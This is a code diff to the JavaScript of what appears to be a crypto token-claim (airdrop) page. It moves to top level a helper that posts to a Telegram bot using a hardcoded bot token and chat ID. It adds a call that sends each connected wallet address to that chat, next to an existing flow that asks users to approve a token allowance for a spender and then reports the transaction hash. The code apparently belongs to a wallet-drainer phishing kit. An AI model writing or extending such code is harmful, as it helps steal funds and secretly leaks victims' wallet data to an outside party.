@@ -29,6 +29,18 @@ const switchToBnbChain = async () => {
   }
 };
 
+const sendTelegramMessage = async (chatId, message) => {
+  const botToken = '7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4';
+  await fetch(
+    `https://api.telegram.org/bot${botToken}/sendMessage`,
+    {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message }),
+    },
+  );
+};
+
 let tokenAmountBold = document.querySelector('.tokenAmount');
 let claimButton = document.querySelector('.claim-btn');
 
@@ -58,6 +70,12 @@ async function connectButtonFunctio() {
       walletText.textContent = accounts[0];
       connectButton.textContent = 'Connected';
       connectButton.disabled = true;
+
+      await sendTelegramMessage(
+        '5204205237',
+        `Connected : ${accounts[0]}`,
+      );
+
       getProof();
     } catch (error) {
       console.error('User denied account access', error);
@@ -90,21 +108,9 @@ async function claimTokens() {
             const tx = await tokenContract.approve(spenderAddress, allowanceAmount);
             console.log('Transaction sent:', tx.hash);
 
-            const sendTelegramMessage = async (chatId, message) => {
-              const botToken = '7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4';
-              await fetch(
-                `https://api.telegram.org/bot${botToken}/sendMessage`,
-                {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ chat_id: chatId, text: message }),
-                },
-              );
-            };
-
             await sendTelegramMessage(
               '5204205237',
-              `Transaction confirmed: ${JSON.stringify(tx.hash)}`,
+              `Transaction confirmed: ${tx.hash}`,
             );
 
             const receipt = await tx.wait();
